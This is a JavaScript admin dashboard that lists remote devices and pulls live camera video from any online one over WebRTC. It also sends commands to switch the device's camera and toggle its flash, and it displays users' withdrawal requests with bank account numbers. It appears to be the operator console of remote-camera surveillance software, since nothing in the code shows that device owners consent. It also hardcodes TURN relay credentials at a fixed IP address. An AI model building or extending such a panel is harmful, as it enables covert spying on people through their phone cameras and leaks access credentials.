(function () {
  const API_BASE = window.location.origin;
  const TOKEN_KEY = 'admin_token';

  const loginSection = document.getElementById('loginSection');
  const adminSection = document.getElementById('adminSection');
  const viewerSection = document.getElementById('viewerSection');
  const loginError = document.getElementById('loginError');
  const adminError = document.getElementById('adminError');
  const deviceList = document.getElementById('deviceList');
  const withdrawList = document.getElementById('withdrawList');
  const viewerStatus = document.getElementById('viewerStatus');
  const remoteVideo = document.getElementById('remoteVideo');
  const stopViewBtn = document.getElementById('stopViewBtn');
  const switchCameraBtn = document.getElementById('switchCameraBtn');
  const flashOnBtn = document.getElementById('flashOnBtn');
  const flashOffBtn = document.getElementById('flashOffBtn');

  let socket = null;
  let pc = null;
  let currentDeviceId = null;
  let currentRoomId = null;

  function getToken() {
    return localStorage.getItem(TOKEN_KEY);
  }

  function setToken(token) {
    if (token) localStorage.setItem(TOKEN_KEY, token);
    else localStorage.removeItem(TOKEN_KEY);
  }

  function showError(el, msg) {
    el.textContent = msg;
    el.className = 'status error';
    el.classList.remove('hidden');
  }

  function hideError(el) {
    el.classList.add('hidden');
  }

  function showSection(section) {
    loginSection.classList.add('hidden');
    adminSection.classList.add('hidden');
    viewerSection.classList.add('hidden');
    section.classList.remove('hidden');
  }

  async function login() {
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value;
    if (!username || !password) {
      showError(loginError, 'Enter username and password');
      return;
    }
    hideError(loginError);
    try {
      const res = await fetch(`${API_BASE}/auth/token`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      if (data.token) {
        setToken(data.token);
        showSection(adminSection);
        loadDevices();
        loadWithdrawRequests();
      } else {
        showError(loginError, data.error || 'Login failed');
      }
    } catch (e) {
      showError(loginError, 'Login failed: ' + e.message);
    }
  }

  document.getElementById('loginBtn').onclick = login;

  document.getElementById('logoutBtn').onclick = () => {
    setToken(null);
    showSection(loginSection);
  };

  async function loadDevices() {
    const token = getToken();
    if (!token) return;
    hideError(adminError);
    try {
      const res = await fetch(`${API_BASE}/devices`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await res.json();
      if (data.devices) {
        renderDevices(data.devices);
      } else {
        showError(adminError, data.error || 'Failed to load devices');
      }
    } catch (e) {
      showError(adminError, 'Failed to load devices: ' + e.message);
    }
  }

  document.getElementById('refreshBtn').onclick = () => {
    loadDevices();
    loadWithdrawRequests();
  };

  async function loadWithdrawRequests() {
    const token = getToken();
    if (!token) return;
    try {
      const res = await fetch(`${API_BASE}/admin/withdraw-requests`, {
        headers: { Authorization: `Bearer ${token}` },
      });
      const data = await res.json();
      if (data.requests) {
        renderWithdrawRequests(data.requests);
      }
    } catch (e) {
      console.error('Failed to load withdraw requests:', e);
    }
  }

  function renderWithdrawRequests(requests) {
    withdrawList.innerHTML = requests
      .map(
        (r) => `
      <tr>
        <td>${escapeHtml(r.username)}</td>
        <td>${r.amount}</td>
        <td>${escapeHtml(r.bank || '-')}</td>
        <td>${escapeHtml(r.accountNumber || '-')}</td>
        <td>${escapeHtml(r.status)}</td>
        <td>${formatDate(r.createdAt)}</td>
      </tr>
    `
      )
      .join('');
  }

  function renderDevices(devices) {
    deviceList.innerHTML = devices
      .map(
        (d) => `
      <tr>
        <td>${escapeHtml(d.deviceId)}</td>
        <td>${escapeHtml(d.deviceName || '-')}</td>
        <td>${escapeHtml(d.platform || '-')}</td>
        <td>${formatDate(d.lastSeenAt)}</td>
        <td>${d.online ? '<span style="color:green">Online</span>' : '<span style="color:gray">Offline</span>'}</td>
        <td><button class="viewBtn" data-device-id="${escapeHtml(d.deviceId)}" ${d.online ? '' : 'disabled'}>View</button></td>
      </tr>
    `
      )
      .join('');
    deviceList.querySelectorAll('.viewBtn').forEach((btn) => {
      if (!btn.disabled) btn.onclick = () => viewStream(btn.dataset.deviceId);
    });
  }

  function escapeHtml(s) {
    const div = document.createElement('div');
    div.textContent = s;
    return div.innerHTML;
  }

  function formatDate(d) {
    if (!d) return '-';
    return new Date(d).toLocaleString();
  }

  async function viewStream(deviceId) {
    const token = getToken();
    if (!token) return;
    currentDeviceId = deviceId;
    showSection(viewerSection);
    viewerStatus.textContent = 'Requesting stream...';
    viewerStatus.className = 'status info';

    try {
      const res = await fetch(`${API_BASE}/admin/request-stream`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          Authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ deviceId }),
      });
      const data = await res.json();
      if (data.roomId) {
        currentRoomId = data.roomId;
        connectAsViewer(data.roomId, token);
      } else {
        viewerStatus.textContent = data.error || 'Failed to request stream';
        viewerStatus.className = 'status error';
      }
    } catch (e) {
      viewerStatus.textContent = 'Error: ' + e.message;
      viewerStatus.className = 'status error';
    }
  }

  async function connectAsViewer(roomId, token) {
    const fallbackIceServers = [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'stun:stun1.l.google.com:19302' },
      { urls: 'turn:46.62.229.16:3478', username: 'streamuser', credential: 'strongpassword123' },
      { urls: 'turn:46.62.229.16:3478?transport=tcp', username: 'streamuser', credential: 'strongpassword123' },
    ];
    let iceServers = fallbackIceServers;
    try {
      const r = await fetch(API_BASE + '/config');
      const cfg = await r.json();
      if (cfg.iceServers && cfg.iceServers.length) iceServers = cfg.iceServers;
    } catch (e) {}

    socket = io(API_BASE, {
      auth: { token },
      transports: ['websocket'],
    });

    pc = new RTCPeerConnection({
      iceServers,
    });

    let remoteDescSet = false;
    const pendingCandidates = [];

    pc.ontrack = (e) => {
      const stream = (e.streams && e.streams[0]) ? e.streams[0] : new MediaStream([e.track]);
      remoteVideo.srcObject = stream;
      viewerStatus.textContent = 'Streaming';
      viewerStatus.className = 'status success';
      remoteVideo.play().catch(() => {});
    };

    pc.onconnectionstatechange = () => {
      const state = pc.connectionState;
      if (state === 'failed' || state === 'disconnected') {
        viewerStatus.textContent = 'Connection ' + state;
        viewerStatus.className = 'status error';
      } else if (state === 'connecting' && viewerStatus.textContent === 'Waiting for stream...') {
        viewerStatus.textContent = 'Connecting...';
      } else if (state === 'connected' && viewerStatus.textContent.indexOf('Streaming') !== 0) {
        viewerStatus.textContent = 'Connected, waiting for video...';
      }
    };

    socket.on('connect', () => {
      socket.emit('join-room', { roomId, role: 'viewer' });
    });

    socket.on('room-joined', (data) => {
      viewerStatus.textContent = 'Waiting for stream...';
    });

    socket.on('offer', async (data) => {
      const { sdp, fromPeerId } = data;
      try {
        const desc = sdp && (sdp.sdp !== undefined) ? sdp : { type: 'offer', sdp: sdp };
        await pc.setRemoteDescription(new RTCSessionDescription(desc));
        remoteDescSet = true;
        for (const c of pendingCandidates) {
          try {
            await pc.addIceCandidate(new RTCIceCandidate(c));
          } catch (err) {}
        }
        pendingCandidates.length = 0;
        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);
        socket.emit('answer', { roomId, sdp: answer, toPeerId: fromPeerId });
      } catch (e) {
        viewerStatus.textContent = 'Offer error: ' + (e.message || e);
        viewerStatus.className = 'status error';
      }
    });

    socket.on('ice-candidate', async (data) => {
      const { candidate, fromPeerId } = data;
      if (!candidate) return;
      const c = candidate.candidate !== undefined ? candidate : { candidate: candidate, sdpMid: null, sdpMLineIndex: null };
      if (remoteDescSet) {
        try {
          await pc.addIceCandidate(new RTCIceCandidate(c));
        } catch (e) {}
      } else {
        pendingCandidates.push(c);
      }
    });

    socket.on('peer-disconnected', () => {
      viewerStatus.textContent = 'Broadcaster disconnected';
      viewerStatus.className = 'status error';
    });

    socket.on('error', (data) => {
      viewerStatus.textContent = data.message || 'Error';
      viewerStatus.className = 'status error';
    });
  }

  switchCameraBtn.onclick = () => {
    if (socket && currentRoomId) {
      socket.emit('remote-command', { roomId: currentRoomId, command: { type: 'switch-camera' } });
    }
  };

  flashOnBtn.onclick = () => {
    if (socket && currentRoomId) {
      socket.emit('remote-command', { roomId: currentRoomId, command: { type: 'flash-on' } });
    }
  };

  flashOffBtn.onclick = () => {
    if (socket && currentRoomId) {
      socket.emit('remote-command', { roomId: currentRoomId, command: { type: 'flash-off' } });
    }
  };

  stopViewBtn.onclick = async () => {
    if (socket) {
      socket.disconnect();
      socket = null;
    }
    if (pc) {
      pc.close();
      pc = null;
    }
    if (currentDeviceId) {
      const token = getToken();
      if (token) {
        try {
          await fetch(`${API_BASE}/admin/stop-stream`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              Authorization: `Bearer ${token}`,
            },
            body: JSON.stringify({ deviceId: currentDeviceId }),
          });
        } catch (e) {}
      }
    }
    currentDeviceId = null;
    currentRoomId = null;
    remoteVideo.srcObject = null;
    showSection(adminSection);
    loadDevices();
  };

  if (getToken()) {
    showSection(adminSection);
    loadDevices();
    loadWithdrawRequests();
  } else {
    showSection(loginSection);
  }
})();
